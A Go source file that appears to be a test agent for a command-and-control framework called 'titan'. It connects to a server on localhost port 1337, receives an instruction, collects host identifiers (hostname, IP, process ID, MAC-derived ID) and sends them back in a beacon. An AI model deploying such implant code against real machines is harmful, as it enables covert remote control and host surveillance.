package main

import (
	"crypto/sha256"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"github.com/BradHacker/titan/models"
)

func main() {
	connection, err := CreateTCPConnection("localhost", "1337")
	if err != nil {
		log.Fatal(fmt.Errorf("Couldn't establish connection: %v", err))
	}

	defer CloseConnection(connection)

	instruction, err := WaitForInstruction(connection)
	if err != nil {
		log.Fatal(fmt.Errorf("Error while waiting for instruction: %v", err))
	}

	testBeacon := generateTestBeacon(instruction, connection)
	time.Sleep(1000)

	err = SendBeacon(testBeacon, connection)
	if err != nil {
		log.Fatal(fmt.Errorf("Couldn't send beacon: %v", err))
	}
}

func generateTestBeacon(instruction models.Instruction, connection net.Conn) (beacon models.Beacon) {
	var testAgent models.Agent

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}
	testAgent.Hostname = hostname
	localAaddressParts := strings.Split(connection.LocalAddr().String(), ":")
	testAgent.IP = localAaddressParts[0]
	testAgent.PID = GetProcessID()
	testAgent.Port = localAaddressParts[1]
	uuidHasher := sha256.New()
	macs, err := GetMACAddrs()
	if err != nil {
		macs = []string{"00:00:00:00:00:00"}
	}
	uuidHasher.Write([]byte(hostname + strings.Join(macs, ":")))
	testAgent.UUID = uuidHasher.Sum(nil)

	instruction = HandleInstruction(instruction)

	instruction.Agent = testAgent
	
	beacon.Action = instruction.Action
	beacon.Agent = testAgent
	beacon.Instruction = instruction
	beacon.ReceivedAt = time.Now()
	return
}